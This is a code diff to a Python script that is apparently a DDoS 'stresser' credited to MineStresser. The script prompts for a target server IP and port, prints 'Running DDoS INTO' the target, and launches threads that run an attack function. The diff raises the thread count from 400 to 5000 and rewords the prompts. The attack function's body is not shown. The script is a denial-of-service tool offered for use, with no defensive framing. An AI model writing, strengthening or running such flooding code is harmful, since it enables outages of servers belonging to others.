@@ -22,20 +22,20 @@ art = r"""
 """
 os.system("clear")
 print("\033[31m" + art)
-print("by: MineStresser")
+print("Credit: MineStresser")
 print(" ")
 time.sleep(1)
-ip = input("IP: ")
-port = int(input("PORT: "))
+ip = input("Enter The Server IP: ")
+port = int(input("Enter The Server Port: "))
 time.sleep(1)
 print(" ")
 os.system("clear")
 print(art)
 print(" ")
-print(f"Running DDoS {ip} {port}")
+print(f"Running DDoS INTO {ip} {port} !")
 # Start Attack
 
-for i in range(400):
+for i in range(5000):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
